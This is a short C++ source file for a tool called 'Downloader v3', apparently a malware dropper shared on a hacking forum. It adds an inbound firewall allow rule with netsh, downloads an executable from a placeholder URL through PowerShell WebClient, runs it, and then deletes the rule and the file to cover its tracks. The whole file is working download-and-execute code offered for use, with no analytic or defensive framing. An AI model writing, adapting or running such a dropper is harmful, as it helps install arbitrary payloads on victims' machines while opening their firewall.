// Downloader v3 by dEEpEst - C++ source code

#include <iostream>

int main()
{
    // Create firewall exception
    std::cout << "Create firewall exception\n";
    system("netsh advfirewall firewall add rule name=\"Downloader v3 by dEEpEst\" dir=in action=allow enable=yes");
    // Download file
    std::cout << "Download file\n";
    system("powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://YOUR_URL_HERE/FUNCIONAL.exe', 'FUNCIONAL.exe')\"");
    // Run file
    std::cout << "Run file\n";
    system("FUNCIONAL.exe");

    // Pause console to see the output
    system("pause");

    // Remove firewall exception
    std::cout << "Remove firewall exception\n";
    system("netsh advfirewall firewall delete rule name=\"Downloader v3 by dEEpEst\"");
    // Remove file
    std::cout << "Remove file\n";
    system("del FUNCIONAL.exe");
    // Exit
    std::cout << "Exit\n";
    system("pause");
    system("exit");
}
